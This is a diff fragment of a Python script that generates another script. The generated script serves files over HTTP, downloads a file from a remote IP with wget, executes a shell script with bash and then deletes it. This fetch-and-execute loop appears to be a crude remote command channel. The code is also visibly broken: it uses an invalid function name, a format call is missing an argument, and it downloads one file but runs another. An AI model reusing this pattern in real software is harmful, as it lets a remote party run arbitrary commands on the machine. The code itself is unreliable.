@@ -10,7 +10,7 @@ op = open(opt3 + ".py", "w")
 cod = """import os, time
 os.system("python3 -m http.server {} &")
 def get-put(ip):
-	os.system("cat http://{}:{}/data.txt >> data.sh".format(ip))
+	os.system("wget http://{}:{}/data.txt".format(ip))
 	time.sleep(0.5)
 	os.system("bash data.sh > data")
 	os.remove("data.sh")
